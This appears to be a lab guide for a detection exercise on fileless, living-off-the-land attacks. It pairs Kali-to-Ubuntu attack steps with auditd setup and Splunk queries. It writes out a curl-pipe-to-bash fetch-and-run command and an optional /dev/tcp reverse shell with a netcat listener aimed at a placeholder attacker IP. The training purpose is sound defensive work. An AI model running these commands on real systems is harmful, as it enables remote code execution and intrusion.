# ‚≠ê **ATTACK - 10: FILELESS MALWARE / LIVING OFF THE LAND (LOTL) ‚Äî T1059**


Fileless malware allows attackers to execute malicious operations **without dropping any file** on the system.
Instead, they use **legitimate system utilities** (curl, bash, PowerShell, Python, etc.) to run malicious commands **directly in memory**, making it very hard for antivirus and EDR solutions to detect.


# üìò **Table: Attack Concept vs Red Team Action vs Detection Focus**

| **Attack Concept**   | **Red Team Action (Root on Ubuntu)**                                                                                                                 | **Advanced Detection Focus**                                                                                                                                                             |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Silent Execution** | Use PowerShell or Python (already available on system) to download a script from Kali and execute it **directly in memory** without writing to disk. | Detect anomalous command-line arguments for trusted processes (e.g., Python handling sockets). Detect execution of native tools (sh, bash, python) from unusual directories like `/tmp`. |
| **MITRE Tactics**    | **Execution (TA0002)**, **Defense Evasion (TA0005)**                                                                                                 | ‚Äî                                                                                                                                                                                        |

---
## üìå **Why This Is LotL?**

  * No malicious file saved
  * Runs directly from memory
  * Uses trusted utilities (curl + bash)
  * Hard for AV/EDR to catch
  * Only visible in audit logs or shell telemetry

Below is your **same content**, but rewritten in **clean sequence**, **proper flow**, **interactive**, **attractive**, and **report-ready** ‚Äî **WITHOUT adding any new technical content** beyond what you already gave.
(Just structured, formatted, and made professional.)

---



# ‚≠ê **OVERVIEW ‚Äî WHAT WE WILL DO**

This activity has **3 simple steps**:

1Ô∏è‚É£ **Attacker (Kali)** ‚Üí Host a fileless payload
2Ô∏è‚É£ **Victim (Ubuntu)** ‚Üí Execute payload *in memory*
3Ô∏è‚É£ **Splunk** ‚Üí Detect curl|bash, tmp execution, and outbound connections

---

## üü¶ **STEP 0 ‚Äî Enable Logging on Ubuntu (Victim)**

Purpose: ensure **every command execution (execve)** is logged so Splunk can detect fileless activity.

### ‚úî Install and enable auditd

```bash
sudo apt update
sudo apt install -y auditd audispd-plugins
sudo systemctl enable --now auditd
```

### ‚úî Add execve audit rules

```bash
sudo auditctl -a exit,always -F arch=b64 -S execve -k exec_log
sudo auditctl -a exit,always -F arch=b32 -S execve -k exec_log
```

üìå **Why?**
Fileless attacks rely on system binaries (curl/bash).
auditd logs command-line arguments, enabling high-fidelity detection.



## üü¶ **STEP 1 ‚Äî Kali (Attacker): Create a Fileless Payload**

### ‚úî Create the payload (stored only on Kali)

```bash
cd /tmp
cat > payload.sh <<'EOF'
#!/bin/bash
echo "HACKED: $(hostname) $(date) by kali" > /tmp/lol.txt
EOF
```

### ‚úî Start a simple HTTP server

```bash
python3 -m http.server 8000
```

üîπ Payload is available at:
`http://<KALI-IP>:8000/payload.sh`

üîπ No file is dropped on Ubuntu ‚Üí **true fileless behavior**.



## üü¶ **STEP 2 ‚Äî Ubuntu (Victim): Execute Payload IN MEMORY**

Run this on Ubuntu (replace `<KALI-IP>`):

```bash
curl http://<KALI-IP>:8000/payload.sh | bash
```

‚û°Ô∏è The payload executes **directly in memory** (nothing written to disk by attacker).
‚û°Ô∏è Only the output file `/tmp/lol.txt` is created as *proof of execution*.

### ‚úî Verify execution:

```bash
cat /tmp/lol.txt
```

You should see:

```
HACKED: <ubuntu-hostname> <timestamp> by kali
```



## üü¶ **STEP 3 ‚Äî Why This Is TRUE LotL / Fileless?**

* No malware file saved on disk
* Uses **legitimate system tools**: curl + bash
* Code executed **directly via pipeline** (`| bash`)
* Leaves minimal artifacts
* Splunk sees only command lines, not malware binaries



## üü¶ **STEP 4 ‚Äî What Logs Get Generated**

Ubuntu produces:

### ‚úî auditd logs (execve):

* `/usr/bin/curl` with URL
* `/bin/bash` reading from STDIN (piped script)

### ‚úî syslog / auth.log:

* User session activity
* sudo invocation (if any)

If Splunk Universal Forwarder watches `/var/log/*` and `/var/log/audit/audit.log`, all events get ingested.



## üü¶ **STEP 5 ‚Äî SPLUNK DETECTIONS (VERY IMPORTANT)**

---

## üîç **Detection 1 ‚Äî curl ‚Üí pipe ‚Üí bash (High Severity)**

```spl
index=os_logs ("curl" AND "| bash") OR ("wget" AND "| sh")
```

You should see an event like:

```
curl http://192.168.56.101:8000/payload.sh | bash
```

---

## üîç **Detection 2 ‚Äî Suspicious Execution in /tmp**

```spl
index=os_logs ("/tmp" AND "bash")
```

Why `/tmp`?
‚úî Writable by everyone
‚úî Common attacker staging area

---

## üîç **Detection 3 ‚Äî Outbound Download Tools (curl / wget)**

```spl
index=os_logs process=curl OR process=wget
```

Shows the victim reaching out to the attacker.

---

## üîç **Detection 4 ‚Äî auditd Execve Details**

If using audit logs:

```spl
index=audit_logs (comm=curl OR comm=bash OR comm=wget)
| table _time, host, user, comm, exe, args
```

Reveals:

* Which binary ran
* Arguments including attacker URL

---

## üîç **Detection 5 ‚Äî /tmp + Interpreters**

```spl
index=os_logs ("/tmp" AND (bash OR sh OR python))
```

Shows suspicious interpreter execution from writable locations.



## üü¶ **STEP 6 (Optional) ‚Äî More Realistic Behavior: Reverse Shell**

‚ö†Ô∏è **Only in isolated lab**

### Kali listener

```bash
nc -lvnp 4444
```

### Ubuntu fileless reverse shell

```bash
echo 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1' > /tmp/p
curl http://<KALI-IP>:8000/p | bash
```

### Splunk Detection

Look for:

* `bash -i`
* `/dev/tcp/`
* outbound connections over unusual ports

---

# ‚≠ê **Short MITRE Mapping (As Provided)**

### **Technique: Fileless Malware / Living Off the Land (T1059)**

| Attack Concept   | Red Team Action                                               | Detection Focus                                             |
| ---------------- | ------------------------------------------------------------- | ----------------------------------------------------------- |
| Silent Execution | Use Python/PowerShell/curl to download + run script in memory | Detect suspicious arguments, native tools running from /tmp |
| MITRE Tactics    | TA0002 (Execution), TA0005 (Defense Evasion)                  | Look for unexpected execution of sh/bash/python             |


